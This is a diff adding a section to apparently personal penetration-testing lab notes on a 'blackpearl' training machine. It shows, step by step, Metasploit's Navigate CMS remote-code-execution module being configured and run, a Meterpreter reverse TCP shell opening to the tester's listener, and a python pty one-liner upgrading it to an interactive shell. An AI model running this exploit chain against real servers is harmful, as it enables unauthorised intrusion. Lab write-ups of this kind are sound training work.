@@ -204,6 +204,135 @@ webshell$
 ```
 - We landed to the webshell shell by doing it manually using the script from the github site. Now we will also try the metasploit.
 
+```
+msfconsole
+search navigate
+use 3
+
+```
+
+```
+msf6 > use 3
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/navigate_cms_rce) > options
+
+Module options (exploit/multi/http/navigate_cms_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.64.4     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+```
+
+Set the parameters `RHOSTS` and `vhost then run`
+
+```
+msf6 exploit(multi/http/navigate_cms_rce) > set RHOSTS 192.168.64.8
+RHOSTS => 192.168.64.8
+
+msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
+
+msf6 exploit(multi/http/navigate_cms_rce) > options
+
+Module options (exploit/multi/http/navigate_cms_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.64.8     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
+   VHOST      blackpearl.tcm   no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.64.4     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+```
+
+Then run it, we were able to go to the shell. It landed to meterpreter then typ shell to go to shell
+
+```
+msf6 exploit(multi/http/navigate_cms_rce) > run
+
+[*] Started reverse TCP handler on 192.168.64.4:4444 
+[+] Login bypass successful
+[+] Upload successful
+[*] Triggering payload...
+[*] Sending stage (39927 bytes) to 192.168.64.8
+[*] Meterpreter session 1 opened (192.168.64.4:4444 -> 192.168.64.8:58304) at 2024-07-10 10:39:27 -0700
+
+meterpreter > shell
+Process 774 created.
+Channel 1 created.
+
+whoami
+www-data
+
+```
+
+However we need a tty session, we we can use the link found in https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell to create a shell session. I used the 
+
+```
+meterpreter > shell
+Process 774 created.
+Channel 1 created.
+
+whoami
+www-data
+which python
+/usr/bin/python
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@blackpearl:~/blackpearl.tcm/navigate$ 
+
+www-data@blackpearl:~/blackpearl.tcm/navigate$ sudo -o
+sudo -o
+bash: sudo: command not found
+www-data@blackpearl:~/blackpearl.tcm/navigate$ sudo -l
+sudo -l
+bash: sudo: command not found
+www-data@blackpearl:~/blackpearl.tcm/navigate$ history
+history
+    1  sudo -o
+    2  sudo -l
+    3  history
+
+```
+
 - Checking the source code of the default website, we see the webmaster: `alek@blackpearl.tcm`
 
 ![[Pasted image 20240710125702.png]]
